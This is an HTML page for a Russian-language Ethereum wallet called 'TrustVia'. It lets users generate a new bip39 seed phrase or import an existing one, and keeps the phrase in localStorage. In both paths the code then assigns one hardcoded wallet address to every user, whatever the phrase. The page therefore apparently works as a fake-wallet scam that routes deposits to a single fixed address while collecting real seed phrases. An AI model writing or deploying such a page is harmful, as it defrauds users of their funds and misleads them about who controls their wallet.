<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TrustVia — Вход</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/index.min.js"></script>
    <style>
        body { background: #0b0b0b; color: white; font-family: sans-serif; margin: 0; min-height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        h1 { font-size: 3rem; font-weight: 900; color: #00d676; margin: 0; text-align: center; }
        p { color: #aaa; margin: 10px 0 30px; text-align: center; }
        button { padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 9999px; width: 100%; max-width: 320px; margin: 10px 0; cursor: pointer; transition: all 0.2s; }
        .primary { background: #00d676; color: black; border: none; }
        .primary:active { transform: scale(0.97); }
        .outline { background: transparent; border: 2px solid #00d676; color: #00d676; }
        .outline:active { background: rgba(0,214,118,0.15); }
        textarea { width: 100%; max-width: 320px; height: 140px; background: #141414; border: 1px solid #333; color: white; border-radius: 16px; padding: 16px; font-family: monospace; margin: 10px 0; }
        .error { color: #ff4d4d; font-size: 0.9rem; margin-top: 8px; display: none; text-align: center; }
        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; background: #111; padding: 16px; border-radius: 16px; margin: 20px 0; }
        .word-item { background: #1a1a1a; padding: 8px; border-radius: 8px; text-align: center; font-size: 0.9rem; font-family: monospace; }
    </style>
</head>
<body>

    <div id="main">
        <h1>TrustVia</h1>
        <p>Ваш кошелёк Ethereum</p>

        <button class="primary" onclick="create()">Создать кошелёк</button>
        <button class="outline" onclick="importShow()">Импортировать</button>
    </div>

    <div id="create" style="display:none; width:100%; max-width:360px;">
        <button class="outline" onclick="showMain()">← Назад</button>
        <h2 style="text-align:center; margin:20px 0;">Секретная фраза</h2>
        <p style="text-align:center; color:#aaa; font-size:0.95rem;">Запиши эти слова и храни в безопасности!</p>
        <div id="words" class="word-grid"></div>
        <button class="primary" onclick="createConfirm()">Я записал</button>
    </div>

    <div id="import" style="display:none; width:100%; max-width:360px;">
        <button class="outline" onclick="showMain()">← Назад</button>
        <h2 style="text-align:center; margin:20px 0;">Импорт</h2>
        <textarea id="phrase" placeholder="word1 word2 word3 ..."></textarea>
        <div id="err" class="error"></div>
        <button class="primary" onclick="importConfirm()">Восстановить</button>
    </div>

    <script>
        function showMain() {
            document.getElementById('main').style.display = 'block';
            document.getElementById('create').style.display = 'none';
            document.getElementById('import').style.display = 'none';
        }

        function create() {
            const mnemonic = bip39.generateMnemonic();
            localStorage.setItem('tempMnemonic', mnemonic);
            const words = mnemonic.split(' ');
            let html = '';
            words.forEach((w, i) => html += `<div class="word-item">${i+1}. ${w}</div>`);
            document.getElementById('words').innerHTML = html;
            document.getElementById('main').style.display = 'none';
            document.getElementById('create').style.display = 'block';
        }

        function createConfirm() {
            if (confirm('Ты точно записал все слова?')) {
                localStorage.setItem('mnemonic', localStorage.getItem('tempMnemonic'));
                localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
                window.location.href = 'index.html';
            }
        }

        function importShow() {
            document.getElementById('main').style.display = 'none';
            document.getElementById('import').style.display = 'block';
        }

        function importConfirm() {
            const phrase = document.getElementById('phrase').value.trim();
            const err = document.getElementById('err');
            err.style.display = 'none';

            if (!phrase) { err.textContent = 'Введи фразу'; err.style.display = 'block'; return; }
            const words = phrase.split(/\s+/).filter(w => w);
            if (words.length !== 12 && words.length !== 24) { err.textContent = 'Нужно 12 или 24 слова'; err.style.display = 'block'; return; }
            if (!bip39.validateMnemonic(phrase)) { err.textContent = 'Неверная фраза'; err.style.display = 'block'; return; }

            if (confirm('Ты уверен?')) {
                localStorage.setItem('mnemonic', phrase);
                localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
                window.location.href = 'index.html';
            }
        }

        showMain();
    </script>
</body>
</html>
